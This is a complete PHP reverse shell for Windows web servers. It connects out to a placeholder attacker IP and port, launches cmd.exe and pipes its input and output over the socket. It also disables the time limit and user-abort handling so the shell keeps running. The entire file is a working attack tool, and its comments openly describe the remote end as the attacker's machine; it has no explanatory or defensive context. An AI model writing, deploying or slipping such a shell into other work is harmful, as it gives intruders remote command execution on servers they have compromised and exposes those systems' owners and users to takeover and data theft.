<?php
ignore_user_abort(true);  // Keep the script running even if user disconnects
set_time_limit(0);        // Remove the time limit

// Remove the execution time limit
set_time_limit(0);

// Set the target IP and port for reverse connection
$ip = 'YOUR_IP';  // Update with your IP
$port = YOUR_PORT;  // Update with your listening port

// Create a socket to connect to the attacker's machine
$sock = fsockopen($ip, $port);

// Check if the connection was successful
if (!$sock) {
    die("Could not connect to $ip:$port");
}

// Windows uses cmd.exe as the default shell
$process = proc_open('cmd.exe', [
    0 => ['pipe', 'r'],  // stdin
    1 => ['pipe', 'w'],  // stdout
    2 => ['pipe', 'w']   // stderr
], $pipes);

// If the process could not be opened, terminate the script
if (!is_resource($process)) {
    die('Could not open cmd.exe');
}

// Loop to handle communication between the remote machine and the Windows shell
while (!feof($sock)) {
    // Read data from the socket
    $input = fread($sock, 2048);
    fwrite($pipes[0], $input);  // Send input to cmd.exe
    
    // Read output from cmd.exe
    $output = fread($pipes[1], 2048);
    fwrite($sock, $output);  // Send the output back to the attacker
}

// Close all pipes and sockets when done
fclose($sock);
foreach ($pipes as $pipe) {
    fclose($pipe);
}
proc_close($process);
?>
